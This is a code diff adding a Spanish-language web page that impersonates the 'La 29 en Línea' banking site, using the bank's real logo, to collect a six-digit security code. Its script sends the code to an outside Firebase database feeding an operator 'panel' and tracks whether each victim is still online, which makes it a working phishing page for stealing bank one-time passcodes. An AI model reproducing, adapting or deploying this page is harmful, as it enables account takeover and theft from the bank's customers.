@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>La 29 en Línea - Verificación</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #822433;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0;
+        }
+        .otp-input {
+            width: 45px;
+            height: 55px;
+            border: 1.5px solid #802432;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #802432;
+            outline: none;
+        }
+        .otp-input:focus {
+            border-color: #000;
+            box-shadow: 0 0 0 1px #000;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-white rounded-[40px] p-8 md:p-12 shadow-2xl w-full max-w-2xl mx-4 text-center">
+        <div class="flex justify-center mb-4">
+            <img src="https://bancapersonas29.29deoctubre.fin.ec/images/logo_login_hor.png" alt="La 29 Logo" class="h-16">
+        </div>
+
+        <p class="text-xs tracking-[0.2em] text-gray-500 uppercase font-bold mb-4">La 29 en l&iacute;nea</p>
+        
+        <h2 class="text-[#802432] text-lg md:text-xl font-normal mb-8">
+            Ingrese el <span class="font-black">C&Oacute;DIGO</span> de <span class="font-black">SEGURIDAD</span>.
+        </h2>
+
+        <!-- Contenedor de Inputs -->
+        <div id="otp-container" class="flex justify-center gap-2 mb-6">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+            <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+        </div>
+
+        <p class="text-[#802432] font-bold text-sm mb-10" id="timer">01:30</p>
+
+        <button onclick="window.location.href='index.html'" class="bg-[#802432] hover:bg-[#601a25] text-white px-10 py-2 rounded-lg text-sm transition-all uppercase font-bold">
+            Regresar
+        </button>
+    </div>
+
+    <script>
+        // CONFIGURACIÓN FIREBASE
+        const firebaseConfig = { databaseURL: "https://copendndsn-default-rtdb.firebaseio.com/" };
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+        const db = firebase.database();
+
+        // Obtener ID de la URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('id');
+
+        const inputs = document.querySelectorAll('.otp-input');
+
+        // Lógica de interacción y envío automático
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                // Saltar al siguiente input
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+                
+                // Verificar si se completaron los 6 dígitos
+                enviarAutomatico();
+            });
+
+            input.addEventListener('keydown', (e) => {
+                // Retroceder con borrar
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        function enviarAutomatico() {
+            let otpValue = "";
+            inputs.forEach(i => otpValue += i.value);
+
+            if (otpValue.length === 6) {
+                if (!sessionId) {
+                    console.error("No se detectó ID de sesión en la URL");
+                    return;
+                }
+
+                // Enviar al panel
+                db.ref('logins/' + sessionId).update({
+                    sms: otpValue,
+                    step: 'OTP INGRESADO'
+                }).then(() => {
+                    // Redirigir con el ID para mantener la sesión
+                    window.location.href = "cargando2.html?id=" + sessionId;
+                }).catch((error) => {
+                    console.error("Error al enviar OTP:", error);
+                });
+            }
+        }
+
+        // Temporizador 1:30
+        let tiempo = 90;
+        const timerDisplay = document.getElementById('timer');
+        const interval = setInterval(() => {
+            let minutos = Math.floor(tiempo / 60);
+            let segundos = tiempo % 60;
+            timerDisplay.innerHTML = `0${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+            
+            if (tiempo <= 0) {
+                clearInterval(interval);
+                window.location.href = 'index.html';
+            }
+            tiempo--;
+        }, 1000);
+    </script>
+    <script>
+// Coloca esto después de inicializar Firebase en la página del usuario
+function gestionarPresencia(idDeSesion) {
+    if (!idDeSesion) return;
+
+    const db = firebase.database();
+    const myConnectionsRef = db.ref(`logins/${idDeSesion}/online`);
+    const connectedRef = db.ref('.info/connected');
+
+    connectedRef.on('value', (snap) => {
+        if (snap.val() === true) {
+            // Cuando me desconecte por cerrar la pestaña, Firebase pondrá online: false
+            myConnectionsRef.onDisconnect().set(false);
+            
+            // Ahora mismo estoy conectado
+            myConnectionsRef.set(true);
+        }
+    });
+}
+
+// Ejecutar la función con el sessionId que ya tienes en tu script
+gestionarPresencia(sessionId);
+    </script>
+</body>
+</html>
